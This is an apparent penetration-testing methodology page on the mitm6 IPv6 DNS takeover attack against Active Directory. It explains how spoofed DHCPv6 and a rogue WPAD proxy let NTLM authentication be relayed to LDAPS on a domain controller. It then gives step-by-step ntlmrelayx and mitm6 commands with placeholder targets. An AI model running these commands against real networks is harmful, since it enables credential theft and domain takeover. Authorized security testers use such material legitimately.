# IPv6 DNS takeover

### IPv6 DNS takeover

IPv6 DNS takeover (mitm6) abuses the fact that Windows enables and prefers IPv6 by default and continuously requests an IPv6 address via DHCPv6, even on IPv4-only networks: because DHCPv6 has no authentication, an attacker can respond to these requests and assign themselves as the client's IPv6 DNS server, taking control of name resolution. With DNS control, the attacker redirects victims to a rogue WPAD proxy (typically using mitm6 + ntlmrelayx) to capture authentication and relay it to LDAP/LDAPS on the Domain Controller, allowing them to dump domain information, create a rogue computer account, or escalate privileges. The risk is network-wide man-in-the-middle, credential theft, and NTLM relaying to critical services, often resulting in full domain compromise, and the root cause is that unconfigured IPv6 is trusted over the legitimate IPv4 setup while the unauthenticated DHCPv6 protocol blindly trusts any responder, an attack surface administrators frequently overlook.

![](<../../.gitbook/assets/afbeelding (3).png>)

### Exploitation

```bash
##### REQUIREMENTS:
# this can be ran if your machine is part of the internal AD network
# it won't work if the AD environment is not using IPv6
 
##### USE THIS TECHNIQUE ONLY IN STINTS OF MAX 10 MINUTES #####
 
##### REFERENCE:
# https://github.com/dirkjanm/mitm6
 
##### START EXPLOITATION
 
# Step 1: run the following command on shell 1
# This command relays captured NTLMv2 credentials over IPv6 to an LDAPS server (often the DC), pretending to be part of the domain testfakepad.{{DOMAIN}}.{{ROOTDNS}}, and stores any looted data in the 'loot' folder.
ntlmrelayx.py -6 -t ldaps://{{RHOST}} -wh 'testfakepad'.'{{DOMAIN}}'.'{{ROOTDNS}}' -l loot
 
# Step 2. run the following command on shell 2
mitm6 -d '{{DOMAIN}}'.'{{ROOTDNS}}'
 
# Step 3. if both commands are running, reboot a workstation of the active directory domain, you will shortly after see a result
...
 
##### END EXPLOITATION
```

